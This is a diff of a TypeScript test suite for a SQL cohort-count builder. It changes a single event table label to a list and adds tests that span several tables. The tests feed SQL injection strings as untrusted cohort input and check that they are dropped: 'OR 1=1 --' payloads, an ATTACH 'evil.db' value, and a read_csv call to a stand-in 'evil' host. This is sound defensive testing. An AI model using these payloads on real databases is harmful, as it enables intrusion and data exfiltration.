@@ -447,7 +447,7 @@ describe('criteria from an untrusted cohort JSON', () => {
     // i.e. an outbound-egress channel out of a "cohort definition".
     const sql = buildCohortCountSql(
       conceptCohort({
-        eventTableLabel: 'Measurement',
+        eventTableLabels: ['Measurement'],
         conceptIds: [1],
         occurrenceCount: { operator: '>=', count: "1 UNION ALL SELECT 1 FROM read_csv('http://evil/x')" },
       }),
@@ -460,7 +460,7 @@ describe('criteria from an untrusted cohort JSON', () => {
   it('drops an occurrence operator outside the declared union', () => {
     const sql = buildCohortCountSql(
       conceptCohort({
-        eventTableLabel: 'Measurement',
+        eventTableLabels: ['Measurement'],
         conceptIds: [1],
         occurrenceCount: { operator: '>= 0 OR 1=1 --', count: 2 },
       }),
@@ -472,7 +472,7 @@ describe('criteria from an untrusted cohort JSON', () => {
   it('drops a value filter whose bound is not a number', () => {
     const sql = buildCohortCountSql(
       conceptCohort({
-        eventTableLabel: 'Measurement',
+        eventTableLabels: ['Measurement'],
         conceptIds: [1],
         valueFilters: [{ operator: '>', value: '0 OR 1=1' }],
       }),
@@ -484,7 +484,7 @@ describe('criteria from an untrusted cohort JSON', () => {
   it('drops a value filter whose operator is not a comparison', () => {
     const sql = buildCohortCountSql(
       conceptCohort({
-        eventTableLabel: 'Measurement',
+        eventTableLabels: ['Measurement'],
         conceptIds: [1],
         valueFilters: [{ operator: 'IS NOT NULL OR 1=1 --', value: 0 }],
       }),
@@ -496,7 +496,7 @@ describe('criteria from an untrusted cohort JSON', () => {
   it('drops a legacy single value filter that is not numeric', () => {
     const sql = buildCohortCountSql(
       conceptCohort({
-        eventTableLabel: 'Measurement',
+        eventTableLabels: ['Measurement'],
         conceptIds: [1],
         valueFilter: { operator: '>', value: '1; ATTACH \'evil.db\' AS e' },
       }),
@@ -516,7 +516,7 @@ describe('criteria from an untrusted cohort JSON', () => {
   it('still emits the filters when the values are legitimate', () => {
     const sql = buildCohortCountSql(
       conceptCohort({
-        eventTableLabel: 'Measurement',
+        eventTableLabels: ['Measurement'],
         conceptIds: [1],
         valueFilters: [{ operator: '>=', value: 3 }, { operator: 'between', value: 1, value2: 9 }],
         occurrenceCount: { operator: '>=', count: 2 },
@@ -593,7 +593,7 @@ describe('concept criteria bound to the stay', () => {
     const c = makeCohort(level)
     c.criteriaTree.children = [{
       kind: 'criterion', id: 'x', type: 'concept', enabled: true, operator: 'AND', exclude: false,
-      config: { eventTableLabel, conceptIds: [50813], conceptNames: {}, ...extra },
+      config: { eventTableLabels: [eventTableLabel], conceptIds: [50813], conceptNames: {}, ...extra },
     }] as never
     return c
   }
@@ -613,13 +613,59 @@ describe('concept criteria bound to the stay', () => {
   it('adds no window at patient level, nor when the event table has no date', () => {
     expect(buildCohortCountSql(cohortOn('patient', 'Lab'), stayMapping)).not.toContain('CAST(e.start_datetime')
     expect(buildCohortCountSql(cohortOn('visit', 'Undated'), stayMapping)).not.toContain('AS TIMESTAMP')
-    expect(conceptCriterionBoundToStay('visit', stayMapping, 'Undated')).toBe(false)
-    expect(conceptCriterionBoundToStay('visit', stayMapping, 'Lab')).toBe(true)
-    expect(conceptCriterionBoundToStay('patient', stayMapping, 'Undated')).toBe(true)
+    expect(conceptCriterionBoundToStay('visit', stayMapping, ['Undated'])).toBe(false)
+    expect(conceptCriterionBoundToStay('visit', stayMapping, ['Lab'])).toBe(true)
+    expect(conceptCriterionBoundToStay('patient', stayMapping, ['Undated'])).toBe(true)
   })
 
   it('leaves an open end when the stay has no end column', () => {
     expect(withinStaySql('e.d', 's', null)).not.toContain('<=')
+  })
+})
+
+describe('concept criteria over several tables, any or every concept', () => {
+  const twoTables = mappingV1ToV2({
+    ...mapping_V1,
+    eventTables: {
+      Lab: { table: 'lab', conceptIdColumn: 'itemid', patientIdColumn: 'person_id', dateColumn: 'charttime' },
+      Chart: { table: 'chart', conceptIdColumn: 'itemid', patientIdColumn: 'person_id', dateColumn: 'charttime' },
+    },
+  } as never)
+  const cohortWith = (config: object): Cohort => {
+    const c = makeCohort('patient')
+    c.criteriaTree.children = [{
+      kind: 'criterion', id: 'x', type: 'concept', enabled: true, operator: 'AND', exclude: false,
+      config: { conceptIds: [1, 2], conceptNames: {}, ...config },
+    }] as never
+    return c
+  }
+  const sqlOf = (config: object) => buildCohortCountSql(cohortWith(config), twoTables)!
+  const fromLab = /FROM linkr_event_lab e/g
+  const fromChart = /FROM linkr_event_chart e/g
+
+  it('searches every table when none is listed, either one sufficing', () => {
+    const sql = sqlOf({})
+    expect(sql.match(fromLab)).toHaveLength(1)
+    expect(sql.match(fromChart)).toHaveLength(1)
+    expect(squash(sql)).toMatch(/EXISTS \(.*\) OR EXISTS \(/)
+  })
+
+  it('searches the listed tables only, and the one of a cohort written before the list', () => {
+    expect(sqlOf({ eventTableLabels: ['Chart'] })).not.toMatch(fromLab)
+    expect(sqlOf({ eventTableLabel: 'Lab' })).not.toMatch(fromChart)
+  })
+
+  it('adds the occurrences up across the tables', () => {
+    const sql = squash(sqlOf({ occurrenceCount: { operator: '>=', count: 3 } }))
+    expect(sql).toMatch(/\( \( SELECT COUNT\(\*\) FROM linkr_event_lab e .*\) \+ \( SELECT COUNT\(\*\) FROM linkr_event_chart e .*\) \) >= 3/)
+  })
+
+  it('requires each concept on its own when every one must be there', () => {
+    const sql = sqlOf({ eventTableLabels: ['Lab'], conceptMatch: 'all' })
+    expect(sql).toContain('e.concept_id IN (1)')
+    expect(sql).toContain('e.concept_id IN (2)')
+    expect(sql).not.toContain('IN (1, 2)')
+    expect(sqlOf({ eventTableLabels: ['Lab'] })).toContain('IN (1, 2)')
   })
 })
 
